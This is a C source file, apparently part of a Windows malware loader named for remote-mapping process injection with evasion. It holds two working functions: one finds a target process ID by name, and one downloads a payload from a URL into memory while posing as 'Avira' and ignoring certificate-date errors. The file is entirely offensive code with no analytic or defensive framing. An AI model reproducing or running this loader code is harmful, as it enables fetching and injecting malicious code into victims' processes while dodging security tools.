#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h> // for Process32FirstW, Process32NextW
#include "RemoteMappingInjection-Evasion.h"

//source: https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
int FindMyProcess(const char* ProcessName) {

	HANDLE hSnapshot;
	PROCESSENTRY32W pe;
	int pid = 0;
	BOOL hResult;

	//Dirty fix for widechar
	WCHAR wProcessName[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, ProcessName, -1, wProcessName, MAX_PATH);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hResult = Process32FirstW(hSnapshot, &pe);
	int count = 0;

	while (hResult) {
		char currentProcess[MAX_PATH];
		WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, currentProcess, MAX_PATH, NULL, NULL);

		if (_wcsicmp(wProcessName, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32NextW(hSnapshot, &pe);
	}

	CloseHandle(hSnapshot);
	return pid;
}

BOOL DownloadPayload(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;
    DWORD		dwBytesRead = NULL;
    SIZE_T		sSize = NULL;
    PBYTE		pBytes = NULL,
        pTmpBytes = NULL;

    hInternet = InternetOpenW(L"Avira", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (pBytes == NULL) {
            bSTATE = FALSE;
            goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}

